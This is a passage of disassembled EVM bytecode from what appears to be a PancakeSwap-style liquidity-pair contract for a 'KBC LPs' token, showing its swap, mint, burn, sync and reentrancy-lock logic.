SHL SUB AND DUP4 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x987 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA11 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xA4E JUMPI PUSH1 0x0 PUSH2 0xA5D JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xA7A JUMPI PUSH1 0x0 PUSH2 0xA89 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xA9A JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xAD5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25DD PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB09 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xAFD DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB21 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xB53 PUSH4 0x5F5E100 PUSH2 0xB47 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xB63 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST LT ISZERO PUSH2 0xBA3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xBB1 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x2079 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCDE JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xD9E JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xD79 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xDA9 DUP5 DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0xE4B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0xE5B PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xED9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF40 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF56 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0xF75 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xF92 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFA0 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0xFDD JUMPI PUSH2 0xFC9 PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22F6 JUMP JUMPDEST SWAP9 POP PUSH2 0xFD8 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x102C JUMP JUMPDEST PUSH2 0x1029 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1001 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x101C DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1023 JUMPI INVALID JUMPDEST DIV PUSH2 0x23CC JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x106B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2690 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1075 DUP11 DUP11 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x10B1 JUMPI PUSH1 0xB SLOAD PUSH2 0x10AD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1174 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1184 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x11F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x120A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1282 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x12A1 DUP9 DUP9 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x12B8 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12BF JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x12D3 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12DA JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x12ED JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x1328 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2627 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1332 ADDRESS DUP5 PUSH2 0x23E4 JUMP JUMPDEST PUSH2 0x133D DUP8 DUP14 DUP14 PUSH2 0x1C69 JUMP JUMPDEST PUSH2 0x1348 DUP7 DUP14 DUP13 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x13A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x142E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x143E DUP6 DUP6 DUP12 DUP12 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x146E JUMPI PUSH1 0xB SLOAD PUSH2 0x146A SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0xF DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1559 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x1608 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x166F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x16DF JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 